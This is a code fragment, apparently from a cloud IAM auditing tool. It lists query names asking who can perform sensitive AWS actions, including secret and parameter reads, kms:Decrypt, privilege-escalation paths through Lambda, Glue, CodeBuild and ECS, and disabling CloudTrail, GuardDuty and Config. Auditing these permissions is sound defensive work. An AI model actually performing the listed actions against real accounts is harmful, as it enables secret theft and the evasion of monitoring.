    ("sts_assumerole",               "who can do sts:AssumeRole"),

    ("secretsmanager_get",           "who can do secretsmanager:GetSecretValue"),
    ("ssm_get_parameter",            "who can do ssm:GetParameter"),
    ("ssm_get_parameters",           "who can do ssm:GetParameters"),
    ("ssm_get_parameters_by_path",   "who can do ssm:GetParametersByPath"),

    ("s3_get_object",                "who can do s3:GetObject"),
    ("s3_put_object",                "who can do s3:PutObject"),
    ("s3_delete_object",             "who can do s3:DeleteObject"),
    ("s3_put_bucket_policy",         "who can do s3:PutBucketPolicy"),

    ("ec2_run_instances",            "who can do ec2:RunInstances"),
    ("lambda_create_function",       "who can do lambda:CreateFunction"),
    ("lambda_update_code",           "who can do lambda:UpdateFunctionCode"),
    ("lambda_add_permission",        "who can do lambda:AddPermission"),
    ("lambda_invoke",                "who can do lambda:InvokeFunction"),
    ("glue_create_job",              "who can do glue:CreateJob"),
    ("glue_update_job",              "who can do glue:UpdateJob"),
    ("cloudformation_create_stack",  "who can do cloudformation:CreateStack"),
    ("cloudformation_update_stack",  "who can do cloudformation:UpdateStack"),
    ("codebuild_create_project",     "who can do codebuild:CreateProject"),
    ("codebuild_start_build",        "who can do codebuild:StartBuild"),
    ("sagemaker_create_training",    "who can do sagemaker:CreateTrainingJob"),
    ("sagemaker_create_notebook",    "who can do sagemaker:CreateNotebookInstance"),
    ("ecs_run_task",                 "who can do ecs:RunTask"),
    ("ecs_register_task_definition", "who can do ecs:RegisterTaskDefinition"),
    ("states_create_statemachine",   "who can do states:CreateStateMachine"),
    ("datapipeline_create_pipeline", "who can do datapipeline:CreatePipeline"),

    ("cloudtrail_stop",              "who can do cloudtrail:StopLogging"),
    ("cloudtrail_delete",            "who can do cloudtrail:DeleteTrail"),
    ("guardduty_delete",             "who can do guardduty:DeleteDetector"),
    ("config_stop",                  "who can do config:StopConfigurationRecorder"),

    ("organizations_create_policy",  "who can do organizations:CreatePolicy"),
    ("rds_describe",                 "who can do rds:DescribeDBInstances"),
    ("kms_decrypt",                  "who can do kms:Decrypt"),
    ("ec2_describe_instances",       "who can do ec2:DescribeInstances"),
]
